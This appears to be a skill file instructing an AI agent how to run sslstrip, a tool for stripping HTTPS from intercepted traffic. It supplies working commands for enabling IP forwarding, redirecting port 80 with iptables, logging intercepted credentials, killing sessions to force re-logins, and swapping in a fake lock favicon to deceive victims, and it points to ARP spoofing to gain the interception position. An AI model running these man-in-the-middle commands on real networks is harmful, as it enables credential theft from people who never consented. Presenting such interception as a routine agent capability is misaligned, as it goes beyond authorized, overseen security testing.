---
name: sslstrip
description: Perform SSL/TLS stripping attacks by transparently hijacking HTTP traffic and converting HTTPS links/redirects into HTTP or homograph-similar links. Use during man-in-the-middle (MITM) attacks to bypass SSL/TLS encryption, capture credentials from secure sessions, or perform session denial.
---

# sslstrip

## Overview
sslstrip is a tool designed to transparently hijack HTTP traffic on a network, watch for HTTPS links and redirects, and then map those links into look-alike HTTP links or homograph-similar HTTPS links. It can also supply a favicon that looks like a lock icon to deceive users. Category: Sniffing & Spoofing.

## Installation (if not already installed)
Assume sslstrip is already installed. If you get a "command not found" error:

```bash
sudo apt update && sudo apt install sslstrip
```

Dependencies: python3, python3-twisted.

## Common Workflows

### Basic SSL Stripping
First, configure IP forwarding and redirect HTTP traffic (port 80) to the sslstrip listening port (default 10000) using iptables:
```bash
echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
sslstrip -w logfile.txt
```

### Capturing All Traffic with Visual Deception
Run sslstrip to log all HTTP/HTTPS traffic and replace site favicons with a "secure" lock icon to reduce user suspicion:
```bash
sslstrip -a -f -w full_capture.log
```

### Targeted Credential Harvesting
Log only SSL POST data (usernames/passwords) and terminate existing sessions to force users to re-login:
```bash
sslstrip -p -k -w credentials.log
```

## Complete Command Reference

```
sslstrip <options>
```

### Options

| Flag | Description |
|------|-------------|
| `-w <filename>`, `--write=<filename>` | Specify file to log to (optional). |
| `-p`, `--post` | Log only SSL POSTs (default behavior). |
| `-s`, `--ssl` | Log all SSL traffic to and from the server. |
| `-a`, `--all` | Log all SSL and HTTP traffic to and from the server. |
| `-l <port>`, `--listen=<port>` | Port to listen on (default: 10000). |
| `-f`, `--favicon` | Substitute a lock favicon on secure requests to mimic a secure connection. |
| `-k`, `--killsessions` | Kill sessions in progress. |
| `-h` | Print the help message. |

## Notes
- **Prerequisites**: This tool requires a Man-in-the-Middle (MITM) position, typically achieved via ARP spoofing (using tools like `arpspoof` or `bettercap`).
- **HSTS**: Modern browsers use HSTS (HTTP Strict Transport Security) which prevents sslstrip from working on many major domains (e.g., Google, Facebook, GitHub) if the browser has previously visited them or they are in the HSTS preload list.
- **IPTables**: Remember to clear your iptables rules after use to restore normal network flow: `iptables -t nat -F`.